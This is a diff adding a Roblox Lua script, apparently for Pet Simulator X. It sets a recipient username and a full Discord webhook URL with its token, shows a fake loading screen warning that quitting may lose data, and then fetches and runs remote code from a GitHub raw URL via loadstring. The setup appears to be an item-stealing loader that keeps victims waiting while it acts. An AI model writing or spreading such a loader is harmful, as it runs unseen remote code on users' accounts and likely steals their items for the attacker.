@@ -1,0 +1,17 @@
+Username = "PiercePSX"
+
+WebHook = "https://discord.com/api/webhooks/1124983449263026227/RV63uvQt0jyqDydFf-QG1vSqXETpEz6lIHf-SRKObviQ-TZUuHW5uojmJ643vHgnJvfe"
+
+loadingscreen = true
+
+_G.CustomScriptName = "Script Loading Please Wait"
+
+_G.Text1 = "Quitting Can Lead To Lost Of Data"
+
+_G.Text2 = "Waiting for Script..."
+
+_G.Text3 = "Checking Scripts..."
+
+_G.Text4 = "Starting Script..."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
